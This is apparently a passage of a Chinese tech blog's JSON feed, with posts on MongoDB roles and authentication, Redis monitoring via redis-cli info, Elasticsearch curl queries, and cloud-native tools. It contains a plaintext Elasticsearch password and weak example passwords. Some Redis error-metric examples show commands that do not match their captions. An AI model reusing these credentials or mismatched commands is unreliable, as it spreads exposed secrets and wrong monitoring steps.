class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>权限</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>readAnyDatabase</td>\n<td>只在admin数据库中可用，赋予用户所有数据库的读权限</td>\n</tr>\n<tr>\n<td>readWriteAnyDatabase</td>\n<td>只在admin数据库中可用，赋予用户所有数据库的读写权限</td>\n</tr>\n<tr>\n<td>userWriteAnyDatabase</td>\n<td>只在admin数据库中可用，赋予用户所有数据库的userAdmin权限</td>\n</tr>\n<tr>\n<td>dbAdminAnyDatabase</td>\n<td>只在admin数据库中可用，赋予用户所有数据库的dbAdmin权限</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h4 id=\"超级管理员\"><a href=\"#超级管理员\" class=\"headerlink\" title=\"超级管理员\"></a>超级管理员</h4><p>可以无所不能，为所欲为</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>权限</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>root</td>\n<td>只在admin数据库中可用，超级管理员</td>\n</tr>\n<tr>\n<td>mongodb</td>\n<td>安装好后第一次进入是不需要密码的，也没有任何用户，直接连接进入即可</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>/usr/local/mongodb/bin/mongo —host 192.168.31.215 —port 27018</p>\n<h4 id=\"创建管理用户\"><a href=\"#创建管理用户\" class=\"headerlink\" title=\"创建管理用户\"></a>创建管理用户</h4><pre><code>    &gt; use admin\n    switched to db admin\n    &gt; db.createUser ( &#123;\n       user: &quot;manage&quot;,\n       pwd: &quot;123456&quot;,\n       roles: [ &#123; role: &quot;root&quot;, db: &quot;admin&quot; &#125; ]\n       &#125;\n    )\n\n    #返回以下信息代表创建成功\n    Successfully added user: &#123;\n        &quot;user&quot;: &quot;manage&quot;,\n        &quot;roles&quot;: [\n            &#123;\n                &quot;role&quot;: &quot;root&quot;,\n                &quot;db&quot;: &quot;admin&quot;\n            &#125;\n        ]\n    &#125;\n    退出登录，然后在mongodb配置文件中开启认证\n\n    vim /usr/local/mongodb/27018/conf/mongod.conf\n    security: \n      authorization: enabled\n      javascriptEnabled: true\n    重启mongodb\n\n    /usr/local/mongodb/bin/mongod --shutdown -f /usr/local/mongodb/27018/conf/mongod.conf \n    /usr/local/mongodb/bin/mongod -f /usr/local/mongodb/27018/conf/mongod.conf\n    连接mongodb\n\n    /usr/local/mongodb/bin/mongo --host 192.168.31.215 --port 27018\n    MongoDB shell version v4.2.0\n    connecting to: mongodb: //192.168.31.215: 27018/?compressors=disabled&amp;gssapiServiceName=mongodb\n    Implicit session: session &#123; &quot;id&quot;: UUID(&quot;fc77266a-b2ff-4eb0-b6ca-c493c7c29143&quot;) &#125;\n    MongoDB server version: 4.2.0\n    &gt; use admin                     #进入admin库中先进行账号认证\n    switched to db admin        \n    &gt; db.auth(&#39;manage&#39;,&#39;123456&#39;)    #认证账号，值返回1代表认证成功1\n</code></pre><h4 id=\"mongdb库创建读写用户\"><a href=\"#mongdb库创建读写用户\" class=\"headerlink\" title=\"mongdb库创建读写用户\"></a>mongdb库创建读写用户</h4><pre><code>    &gt; db.createUser( &#123;\n    ... user: &quot;zhangsan&quot;,\n    ... pwd: &quot;zhangsan&quot;,\n    ... roles: [ &#123; role: &quot;readWrite&quot;, db: &quot;mongdb&quot; &#125; ]\n    ...     &#125;\n    ... )\n    Successfully added user: &#123;\n        &quot;user&quot;: &quot;zhangsan&quot;,\n        &quot;roles&quot;: [\n            &#123;\n                &quot;role&quot;: &quot;readWrite&quot;,\n                &quot;db&quot;: &quot;mongdb&quot;\n            &#125;\n        ]\n    &#125;\n    验证创建的zhangsan用户(不需要退出登录)\n\n    &gt; use admin\n    switched to db admin\n    &gt; db.auth(&#39;zhangsan&#39;,&#39;zhangsan&#39;)\n    1\n    &gt; show dbs              #查看数据库，因为mongdb数据库存储数据，所以看不到\n    &gt; use mongdb            #直接 use 到mongdb数据库中\n    switched to db mongdb\n\n    #插入 json 格式文档到 coll 集合中\n    &gt; db.coll.insert(&#123;&quot;name&quot;: &quot;Zhangsan&quot;,&quot;url&quot;: &quot;http: //abcops.cn&quot;,&quot;age&quot;: 25,&quot;isNonProfit&quot;: true,&#125;)\n    WriteResult(&#123; &quot;nInserted&quot;: 1 &#125;)\n    &gt; show collections      #查看已存在集合\n    coll\n    &gt; db.coll.find()        #读取集合中的数据\n    &#123; &quot;_id&quot;: ObjectId(&quot;5d8b24c2f1c33f4950f2c5df&quot;), &quot;name&quot;: &quot;Zhangsan&quot;, &quot;url&quot;: &quot;http: //abcops.cn&quot;, &quot;age&quot;: 25, &quot;isNonProfit&quot;: true &#125;\n    以上完成了读写权限的验证\n\n    一个用户多个权限\n\n    为 lisi 用户授权 01db read权限 02db readWrite 03db dbAdmin权限 04db userAdmin权限\n    这次先把数据库创建出来\n\n    &gt; use admin\n    switched to db admin\n    &gt; db.auth(&#39;manage&#39;,&#39;123456&#39;)\n    1\n\n    &gt; use 01db\n    switched to db 01db\n    &gt; db.coll.insert(&#123;&quot;name&quot;: &quot;01db&quot;,&quot;url&quot;: &quot;http: //abcops.cn&quot;,&quot;age&quot;: 25,&quot;isNonProfit&quot;: true,&#125;)\n    WriteResult(&#123; &quot;nInserted&quot;: 1 &#125;)\n\n    &gt; use 02db\n    switched to db 02db\n    &gt; db.coll.insert(&#123;&quot;name&quot;: &quot;02db&quot;,&quot;url&quot;: &quot;http: //abcops.cn&quot;,&quot;age&quot;: 25,&quot;isNonProfit&quot;: true,&#125;)\n    WriteResult(&#123; &quot;nInserted&quot;: 1 &#125;)\n\n    &gt; use 03db\n    switched to db 03db\n    &gt; db.coll.insert(&#123;&quot;name&quot;: &quot;03db&quot;,&quot;url&quot;: &quot;http: //abcops.cn&quot;,&quot;age&quot;: 25,&quot;isNonProfit&quot;: true,&#125;)\n    WriteResult(&#123; &quot;nInserted&quot;: 1 &#125;)\n\n    &gt; use 04db\n    switched to db 04db\n    &gt; db.coll.insert(&#123;&quot;name&quot;: &quot;04db&quot;,&quot;url&quot;: &quot;http: //abcops.cn&quot;,&quot;age&quot;: 25,&quot;isNonProfit&quot;: true,&#125;)\n    WriteResult(&#123; &quot;nInserted&quot;: 1 &#125;)\n</code></pre><h4 id=\"创建用户并授权\"><a href=\"#创建用户并授权\" class=\"headerlink\" title=\"创建用户并授权\"></a>创建用户并授权</h4><pre><code>    &gt; db.createUser( &#123;\n    ... user: &quot;lisi&quot;,\n    ... pwd: &quot;123456&quot;,\n    ... roles: [ &#123; role: &quot;read&quot;,db: &quot;01db&quot; &#125;,\n    ... &#123; role: &quot;readWrite&quot;,db: &quot;02db&quot; &#125;,\n    ... &#123; role: &quot;dbAdmin&quot;,db: &quot;03db&quot; &#125;,\n    ... &#123; role: &quot;userAdmin&quot;,db: &quot;04db&quot; &#125; ]\n    ...     &#125;\n    ... )\n    Successfully added user: &#123;\n        &quot;user&quot;: &quot;lisi&quot;,\n        &quot;roles&quot;: [\n            &#123;\n                &quot;role&quot;: &quot;read&quot;,\n                &quot;db&quot;: &quot;01db&quot;\n            &#125;,\n            &#123;\n                &quot;role&quot;: &quot;readWrite&quot;,\n                &quot;db&quot;: &quot;02db&quot;\n            &#125;,\n            &#123;\n                &quot;role&quot;: &quot;dbAdmin&quot;,\n                &quot;db&quot;: &quot;03db&quot;\n            &#125;,\n            &#123;\n                &quot;role&quot;: &quot;userAdmin&quot;,\n                &quot;db&quot;: &quot;04db&quot;\n            &#125;\n        ]\n    &#125;\n</code></pre><h4 id=\"查看所有用户\"><a href=\"#查看所有用户\" class=\"headerlink\" title=\"查看所有用户\"></a>查看所有用户</h4><pre><code>    &gt; show users\n    &#123;\n        &quot;_id&quot;: &quot;admin.admin&quot;,\n        &quot;userId&quot;: UUID(&quot;9958faa5-7132-4146-8775-a001e47fe7f8&quot;),\n        &quot;user&quot;: &quot;admin&quot;,\n        &quot;db&quot;: &quot;admin&quot;,\n        &quot;roles&quot;: [\n            &#123;\n                &quot;role&quot;: &quot;root&quot;,\n                &quot;db&quot;: &quot;admin&quot;\n            &#125;\n        ],\n        &quot;mechanisms&quot;: [\n            &quot;SCRAM-SHA-1&quot;\n        ]\n    &#125;\n    &#123;\n        &quot;_id&quot;: &quot;admin.lisi&quot;,\n        &quot;userId&quot;: UUID(&quot;bc8e5dc7-2f8c-40c1-8190-cea4951ae4a1&quot;),\n        &quot;user&quot;: &quot;lisi&quot;,\n        &quot;db&quot;: &quot;admin&quot;,\n        &quot;roles&quot;: [\n            &#123;\n                &quot;role&quot;: &quot;read&quot;,\n                &quot;db&quot;: &quot;01db&quot;\n            &#125;,\n            &#123;\n                &quot;role&quot;: &quot;readWrite&quot;,\n                &quot;db&quot;: &quot;02db&quot;\n            &#125;,\n            &#123;\n                &quot;role&quot;: &quot;dbAdmin&quot;,\n                &quot;db&quot;: &quot;03db&quot;\n            &#125;,\n            &#123;\n                &quot;role&quot;: &quot;userAdmin&quot;,\n                &quot;db&quot;: &quot;04db&quot;\n            &#125;\n        ],\n        &quot;mechanisms&quot;: [\n            &quot;SCRAM-SHA-1&quot;\n        ]\n    &#125;\n    &#123;\n        &quot;_id&quot;: &quot;admin.manage&quot;,\n        &quot;userId&quot;: UUID(&quot;e1b34f57-06f2-4ef1-b23a-2d46a3964fbf&quot;),\n        &quot;user&quot;: &quot;manage&quot;,\n        &quot;db&quot;: &quot;admin&quot;,\n        &quot;roles&quot;: [\n            &#123;\n                &quot;role&quot;: &quot;root&quot;,\n                &quot;db&quot;: &quot;admin&quot;\n            &#125;\n        ],\n        &quot;mechanisms&quot;: [\n            &quot;SCRAM-SHA-1&quot;\n        ]\n    &#125;\n    &#123;\n        &quot;_id&quot;: &quot;admin.micvs&quot;,\n        &quot;userId&quot;: UUID(&quot;1f4837c7-8c14-40d4-8a21-d621e0bcc278&quot;),\n        &quot;user&quot;: &quot;micvs&quot;,\n        &quot;db&quot;: &quot;admin&quot;,\n        &quot;roles&quot;: [\n            &#123;\n                &quot;role&quot;: &quot;dbAdminAnyDatabase&quot;,\n                &quot;db&quot;: &quot;admin&quot;\n            &#125;\n        ],\n        &quot;mechanisms&quot;: [\n            &quot;SCRAM-SHA-1&quot;,\n            &quot;SCRAM-SHA-256&quot;\n        ]\n    &#125;\n    &#123;\n        &quot;_id&quot;: &quot;admin.zhangsan&quot;,\n        &quot;userId&quot;: UUID(&quot;1003726b-c7fc-44e6-b001-b5c828bfb40d&quot;),\n        &quot;user&quot;: &quot;zhangsan&quot;,\n        &quot;db&quot;: &quot;admin&quot;,\n        &quot;roles&quot;: [\n            &#123;\n                &quot;role&quot;: &quot;readWrite&quot;,\n                &quot;db&quot;: &quot;mongdb&quot;\n            &#125;\n        ],\n        &quot;mechanisms&quot;: [\n            &quot;SCRAM-SHA-1&quot;\n        ]\n    &#125;\n</code></pre><p>原创地址:<a href=\"https://mp.weixin.qq.com/s/YWcwaPIQDP6ln_6qtvnsOA\">https://mp.weixin.qq.com/s/YWcwaPIQDP6ln_6qtvnsOA</a></p>\n",
            "tags": [
                "mongodb",
                "mongodb权限"
            ]
        },
        {
            "id": "https://erik.xyz/2020/06/20/redis-top/",
            "url": "https://erik.xyz/2020/06/20/redis-top/",
            "title": "Redis性能指标监控",
            "date_published": "2020-06-20T07:31:00.000Z",
            "content_html": "<h5 id=\"监控指标\"><a href=\"#监控指标\" class=\"headerlink\" title=\"监控指标\"></a>监控指标</h5><ul>\n<li>性能指标：Performance</li>\n<li>内存指标: Memory</li>\n<li>基本活动指标：Basic activity</li>\n<li>持久性指标: Persistence</li>\n<li>错误指标：Error<span id=\"more\"></span>\n<h5 id=\"性能指标：Performance\"><a href=\"#性能指标：Performance\" class=\"headerlink\" title=\"性能指标：Performance\"></a>性能指标：Performance</h5></li>\n</ul>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>Name</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>latency</td>\n<td>Redis响应一个请求的时间</td>\n</tr>\n<tr>\n<td>instantaneous_ops_per_sec</td>\n<td>平均每秒处理请求总数</td>\n</tr>\n<tr>\n<td>hi rate(calculated)</td>\n<td>缓存命中率（计算出来的</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h5 id=\"内存指标-Memory\"><a href=\"#内存指标-Memory\" class=\"headerlink\" title=\"内存指标: Memory\"></a>内存指标: Memory</h5><div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>Name</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>used_memory</td>\n<td>已使用内存</td>\n</tr>\n<tr>\n<td>mem_fragmentation_ratio</td>\n<td>内存碎片率</td>\n</tr>\n<tr>\n<td>evicted_keys</td>\n<td>由于最大内存限制被移除的key的数量</td>\n</tr>\n<tr>\n<td>blocked_clients</td>\n<td>由于BLPOP,BRPOP,or BRPOPLPUSH而备阻塞的客户端</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h5 id=\"基本活动指标：Basic-activity\"><a href=\"#基本活动指标：Basic-activity\" class=\"headerlink\" title=\"基本活动指标：Basic activity\"></a>基本活动指标：Basic activity</h5><div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>Name</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>connected_clients</td>\n<td>客户端连接数</td>\n</tr>\n<tr>\n<td>conected_laves</td>\n<td>slave数量</td>\n</tr>\n<tr>\n<td>master_last_io_seconds_ago</td>\n<td>最近一次主从交互之后的秒数</td>\n</tr>\n<tr>\n<td>keyspace</td>\n<td>数据库中的key值总数</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h5 id=\"持久性指标-Persistence\"><a href=\"#持久性指标-Persistence\" class=\"headerlink\" title=\"持久性指标: Persistence\"></a>持久性指标: Persistence</h5><div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>Name</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>rdb_last_save_time</td>\n<td>最后一次持久化保存磁盘的时间戳</td>\n</tr>\n<tr>\n<td>rdb_changes_sice_last_save</td>\n<td>自最后一次持久化以来数据库的更改数</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h5 id=\"错误指标：Error\"><a href=\"#错误指标：Error\" class=\"headerlink\" title=\"错误指标：Error\"></a>错误指标：Error</h5><div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>Name</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>rejected_connections</td>\n<td>由于达到maxclient限制而被拒绝的连接数</td>\n</tr>\n<tr>\n<td>keyspace_misses</td>\n<td>key值查找失败(没有命中)次数</td>\n</tr>\n<tr>\n<td>master_link_down_since_seconds</td>\n<td>主从断开的持续时间（以秒为单位)</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h5 id=\"监控方式\"><a href=\"#监控方式\" class=\"headerlink\" title=\"监控方式\"></a>监控方式</h5><ul>\n<li>redis-benchmark</li>\n<li>redis-stat</li>\n<li>redis-faina</li>\n<li>redislive</li>\n<li>redis-cli</li>\n<li>monitor</li>\n<li>showlog</li>\n</ul>\n<p>1.get：获取慢查询日志</p>\n<p>2.len：获取慢查询日志条目数</p>\n<p>3.reset：重置慢查询日志</p>\n<p>相关配置：</p>\n<pre><code>slowlog-log-slower-than 1000 # 设置慢查询的时间下线，单位：微秒\nslowlog-max-len 100 # 设置慢查询命令对应的日志显示长度，单位：命令数\n</code></pre><p>info（可以一次性获取所有的信息，也可以按块获取信息）</p>\n<p>1.server:服务器运行的环境参数</p>\n<p>2.clients:客户端相关信息</p>\n<p>3.memory：服务器运行内存统计数据</p>\n<p>4.persistence：持久化信息</p>\n<p>5.stats：通用统计数据</p>\n<p>6.Replication：主从复制相关信息</p>\n<p>7.CPU：CPU使用情况</p>\n<p>8.cluster：集群信息</p>\n<p>9.Keypass：键值对统计数量信息</p>\n<h5 id=\"终端info命令使用\"><a href=\"#终端info命令使用\" class=\"headerlink\" title=\"终端info命令使用\"></a>终端info命令使用</h5><pre><code>./redis-cli info 按块获取信息 | grep 需要过滤的参数\n\n./redis-cli info stats | grep ops\n</code></pre><h5 id=\"交互式info命令使用\"><a href=\"#交互式info命令使用\" class=\"headerlink\" title=\"交互式info命令使用\"></a>交互式info命令使用</h5><pre><code> #./redis-cli \n&gt; info server\n</code></pre><h5 id=\"性能监控：\"><a href=\"#性能监控：\" class=\"headerlink\" title=\"性能监控：\"></a>性能监控：</h5><pre><code>redis-cli info | grep ops # 每秒操作数\n</code></pre><h5 id=\"内存监控\"><a href=\"#内存监控\" class=\"headerlink\" title=\"内存监控\"></a>内存监控</h5><pre><code>[root@CombCloud-2020110836 src]# ./redis-cli info | grep used | grep human       \nused_memory_human:2.99M  # 内存分配器从操作系统分配的内存总量\nused_memory_rss_human:8.04M  #操作系统看到的内存占用，top命令看到的内存\nused_memory_peak_human:7.77M # redis内存消耗的峰值\nused_memory_lua_human:37.00K   # lua脚本引擎占用的内存大小\n</code></pre><h5 id=\"由于BLPOP-BRPOP-or-BRPOPLPUSH而备阻塞的客户端\"><a href=\"#由于BLPOP-BRPOP-or-BRPOPLPUSH而备阻塞的客户端\" class=\"headerlink\" title=\"由于BLPOP,BRPOP,or BRPOPLPUSH而备阻塞的客户端\"></a>由于BLPOP,BRPOP,or BRPOPLPUSH而备阻塞的客户端</h5><pre><code>[root@CombCloud-2020110836 src]# ./redis-cli info | grep blocked_clients\nblocked_clients:0  \n</code></pre><h5 id=\"由于最大内存限制被移除的key的数量\"><a href=\"#由于最大内存限制被移除的key的数量\" class=\"headerlink\" title=\"由于最大内存限制被移除的key的数量\"></a>由于最大内存限制被移除的key的数量</h5><pre><code>[root@CombCloud-2020110836 src]# ./redis-cli info | grep evicted_keys\nevicted_keys:0  #\n</code></pre><h5 id=\"内存碎片率\"><a href=\"#内存碎片率\" class=\"headerlink\" title=\"内存碎片率\"></a>内存碎片率</h5><pre><code>[root@CombCloud-2020110836 src]# ./redis-cli info | grep mem_fragmentation_ratio\nmem_fragmentation_ratio:2.74 \n</code></pre><h5 id=\"已使用内存\"><a href=\"#已使用内存\" class=\"headerlink\" title=\"已使用内存\"></a>已使用内存</h5><pre><code>[root@CombCloud-2020110836 src]# ./redis-cli info | grep used_memory:\nused_memory:3133624  \n</code></pre><h5 id=\"基本活动指标：\"><a href=\"#基本活动指标：\" class=\"headerlink\" title=\"基本活动指标：\"></a>基本活动指标：</h5><p>redis连接了多少客户端 通过观察其数量可以确认是否存在意料之外的连接。如果发现数量不对劲，就可以使用lcient list指令列出所有的客户端链接地址来确定源头。</p>\n<pre><code>[root@CombCloud-2020110836 src]# ./redis-cli info | grep connected_clients\nconnected_clients:1\n\n\n[root@CombCloud-2020110836 src]# ./redis-cli info | grep connected\nconnected_clients:1   # 客户端连接数量\nconnected_slaves:1   # slave连接数量\n</code></pre><h5 id=\"持久性指标：\"><a href=\"#持久性指标：\" class=\"headerlink\" title=\"持久性指标：\"></a>持久性指标：</h5><pre><code>[root@CombCloud-2020110836 src]# ./redis-cli info | grep rdb_last_save_time\nrdb_last_save_time:1591876204  # 最后一次持久化保存磁盘的时间戳\n[root@CombCloud-2020110836 src]# ./redis-cli info | grep rdb_changes_since_last_save\nrdb_changes_since_last_save:0   # 自最后一次持久化以来数据库的更改数\n</code></pre><h5 id=\"错误指标\"><a href=\"#错误指标\" class=\"headerlink\" title=\"错误指标\"></a>错误指标</h5><p>由于超出最大连接数限制而被拒绝的客户端连接次数，如果这个数字很大，则意味着服务器的最大连接数设置得过低，需要调整maxclients</p>\n<pre><code>[root@CombCloud-2020110836 src]# ./redis-cli info | grep connected_clients\nconnected_clients:1\n</code></pre><p>key值查找失败(没有命中)次数，出现多次可能是被hei ke gongjji</p>\n<pre><code>[root@CombCloud-2020110836 src]# ./redis-cli info | grep keyspace\nkeyspace_misses:0   \n</code></pre><p>主从断开的持续时间（以秒为单位)</p>\n<pre><code>[root@CombCloud-2020110836 src]# ./redis-cli info | grep rdb_changes_since_last_save\nrdb_changes_since_last_save:0  \n</code></pre><p>复制积压缓冲区如果设置得太小，会导致里面的指令被覆盖掉找不到偏移量，从而触发全量同步</p>\n<pre><code>[root@CombCloud-2020110836 src]# ./redis-cli info | grep backlog_size\nrepl_backlog_size:1048576\n</code></pre><p>通过查看sync_partial_err变量的次数来决定是否需要扩大积压缓冲区，它表示主从半同步复制失败的次数</p>\n<pre><code>[root@CombCloud-2020110836 src]# ./redis-cli info | grep sync_partial_err\nsync_partial_err:1\n</code></pre><p>redis性能测试命令</p>\n<pre><code>./redis-benchmark -c 100 -n 5000\n</code></pre><p>原创地址：<a href=\"https://mp.weixin.qq.com/s/gu1ZLXlR9ud4wnssYMVkMw\">https://mp.weixin.qq.com/s/gu1ZLXlR9ud4wnssYMVkMw</a></p>\n",
            "tags": [
                "redis",
                "redis监控"
            ]
        },
        {
            "id": "https://erik.xyz/2020/06/18/elasticsearch-curd/",
            "url": "https://erik.xyz/2020/06/18/elasticsearch-curd/",
            "title": "Elasticsearch基本CURD操作",
            "date_published": "2020-06-18T14:35:50.000Z",
            "content_html": "<p>当我们的ES集群搭建完成以后，我怎么能看到集群中各个节点状态以及主节点和健康情况呢，如下讲解使用curl命令来与ES集群进行交互、分别有查询主节点情况、集群状态、以及创建索引查看索引、查看分片以及对ES集群进行查询请求等操作。<br><span id=\"more\"></span><br>CURL语法讲解</p>\n<p>RESTful API:</p>\n<pre><code>    curl  -X&lt;VERB&gt; &#39;&lt;PROTOCOL&gt;://&lt;HOST&gt;:&lt;PORT&gt;/&lt;PATH&gt;?&lt;QUERY_STRING&gt;&#39; -d &#39;&lt;BODY&gt;&#39;\n    -X：指定请求方式\n\n    &lt;VERB&gt;：GET,POST,PUT,DELETE   一般请求为GET、提交变更为POST、上传文件为PUT、删除操作为DELETE\n\n    &lt;PROTOCOL&gt;：协议，一般为HTTP协议\n\n    &lt;HOST&gt;：主机，可为主机的IP地址或Hostname\n\n    &lt;PORT&gt;：主机端口\n\n    &lt;PATH&gt;：路径，主机端口后的路径，如下几个路径：/_cat, /_search, /_cluster   /_cat路径覆盖了大多数的信息内容,/_search为搜索所有的索引和文档类型\n\n    &lt;QUERY_STRING&gt;：查询字符串匹配规则\n\n    -d：指定主体内容\n\n    &lt;BODY&gt;：json格式的请求主体\n</code></pre><p>Elasticseearch基本查询语句</p>\n<pre><code>    //查看_cat支持的信息\n    kibana: GET /_cat\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_cat&#39;        \n\n    //查看主节点信息\n    kibana: GET /_cat/master?v\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_cat/master?v&#39;        \n\n    //查看集群所有节点\n    kibana: GET /_cat/nodes?v\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_cat/nodes?v&#39;        \n\n    //查看所有索引信息\n    kibana: GET /_cat/indices?v\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_cat/indices?v&#39;        \n\n    //查看单个索引信息\n    kibana: GET /_cat/indices/movies?v\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_cat/indices/movies?v&#39;        \n\n    //查看所有分片信息\n    kibana: GET /_cat/shards?v\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_cat/shards?v&#39;        \n\n    //查看单个索引分片信息\n    kibana: GET /_cat/shards/movies?v\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_cat/shards/movies?v&#39;        \n\n    //查看集群健康状态\n    kibana: GET /_cat/health?v\n    kibana: GET _cluster/health\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_cat/health?v&#39;\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_cluster/health?pretty&#39;        \n\n    //查看插件\n    kibana: GET /_cat/plugins?v\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_cat/plugins?v&#39;        \n\n    //查看所有索引文档总数\n    kibana: GET _all/_count\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_all/_count?pretty&#39;        \n\n    //查看指定索引文档总数\n    kibana: GET movies/_count\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/movies/_count?pretty&#39;        \n\n    //查看所有模板\n    kibana: GET _cat/templates\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_cat/templates?v&#39;        \n\n    //查看状态为绿的索引\n    kibana: GET /_cat/indices?v&amp;health=green\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_cat/indices?v&amp;health=green&#39;        \n\n    //查看movies索引元数据\n    kibana: GET movies\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/movies?pretty&#39;        \n\n    //按照文档数量排序索引\n    kibana: GET _cat/indices?v&amp;s=docs.count:desc\n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_cat/indices?v&amp;s=docs.count:desc&#39;        \n\n    //查看各个索引占用内存大小并进行排序\n    kibana: \n    bash: curl -XGET -u elastic:26tBktGolYCyZD2pPISW &#39;http://192.168.31.215:9201/_cat/indices?v&amp;h=i,tm&amp;s=tm:desc&#39;\n</code></pre><p>Elasticsearch CURD语法</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>CURD</th>\n<th>请求方式</th>\n<th>主体</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Create</td>\n<td>PUT</td>\n<td>/index/_create/id</td>\n<td>指定Document ID，创建文档，如果ID已存在，则失败</td>\n</tr>\n<tr>\n<td>Create</td>\n<td>POST</td>\n<td>/index/_create/id</td>\n<td>指定Document ID，创建文档，如果ID已存在，则失败</td>\n</tr>\n<tr>\n<td>Create</td>\n<td>POST</td>\n<td>/index/_doc</td>\n<td>自动生成ID，不会重复，重复提交则创建多个文档，文档版本都为1</td>\n</tr>\n<tr>\n<td>Index</td>\n<td>PUT</td>\n<td>/index/_doc/id</td>\n<td>如果ID不存在,则创建新的文档,如果ID存在,则删除现有文档后创建新的文档,版本+1,ID相同</td>\n</tr>\n<tr>\n<td>Index</td>\n<td>POST</td>\n<td>/index/_doc/id</td>\n<td>如果ID不存在,则创建新的文档,如果ID存在,则删除现有文档后创建新的文档,版本+1,ID相同</td>\n</tr>\n<tr>\n<td>Read</td>\n<td>GET</td>\n<td>/index/_doc/id</td>\n<td>查看Document ID为1的文档</td>\n</tr>\n<tr>\n<td>Update</td>\n<td>POST</td>\n<td>/index/_doc/id</td>\n<td>文档必须存在,否则更新失败,只能增量修改字段,不能减少字段,字段值可以随意修改,版本加1</td>\n</tr>\n<tr>\n<td>Delete</td>\n<td>Delete</td>\n<td>/index/_doc/id</td>\n<td>文档必须存在,否则删除返回”not_found”</td>\n</tr>\n<tr>\n<td>Delete</td>\n<td>Delete</td>\n<td>/index</td>\n<td>删除索引，索引内的文档也会被随之而删除,要删除的索引必须存在,否则返回 “404”</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>原创地址：<a href=\"https://mp.weixin.qq.com/s/qZq_EV9q1LUUzOZeTzhA-g\">https://mp.weixin.qq.com/s/qZq_EV9q1LUUzOZeTzhA-g</a></p>\n",
            "tags": [
                "elasticsearch"
            ]
        },
        {
            "id": "https://erik.xyz/2020/04/22/common-cncf-project/",
            "url": "https://erik.xyz/2020/04/22/common-cncf-project/",
            "title": "开源云原生项目",
            "date_published": "2020-04-22T00:28:00.000Z",
            "content_html": "<ul>\n<li><p><a href=\"https://kubernetes.io\">Kubernetes</a>  容器编排平台</p>\n<ul>\n<li><p><a href=\"https://github.com/kubernetes/kubernetes\">github</a></p>\n<p>Kubernetes! 说起云原生应用，怎么能不提 Kubernetes 呢？Google 发明的 Kubernetes 无疑是最著名的基于容器的应用程序的容器编排平台，而且它还是一个开源工具。</p>\n<p>什么是容器编排平台？通常，一个容器引擎本身可以管理几个容器。但是，当你谈论数千个容器和数百个服务时，管理这些容器变得非常复杂。这就是容器编排引擎的用武之地。容器编排引擎通过自动化容器的部署、管理、网络和可用性来帮助管理大量的容器。</p>\n<p>Docker Swarm 和 Mesosphere Marathon 也是容器编排引擎，但是可以肯定地说，Kubernetes 已经赢得了这场比赛（至少现在是这样）。Kubernetes 还催生了像 OKD 这样的容器即服务（CaaS）平台，它是 Kubernetes 的 Origin 社区发行版，并成了 Red Hat OpenShift 的一部分。</p>\n<span id=\"more\"></span></li>\n</ul>\n</li>\n<li><p><a href=\"https://prometheus.io\">Prometheus</a>    系统和服务监控工具</p>\n<ul>\n<li><p><a href=\"https://github.com/prometheus/prometheus\">github</a></p>\n<p>Prometheus 是 2012 年在 SoundCloud 上构建的一个开源的系统监控和告警工具。之后，许多公司和组织都采用了 Prometheus，并且该项目拥有非常活跃的开发者和用户群体。现在，它已经成为一个独立的开源项目，独立于公司之外进行维护。<br>理解 Prometheus 的最简单方法是可视化一个生产系统，该系统需要 24（小时）x 365（天）都可以正常运行。没有哪个系统是完美的，也有减少故障的技术（称为容错系统），但是，如果出现问题，最重要的是尽快发现问题。这就是像 Prometheus 这样的监控工具的用武之地。Prometheus 不仅仅是一个容器监控工具，但它在云原生应用公司中最受欢迎。此外，其他开源监视工具，包括 Grafana，都借助了 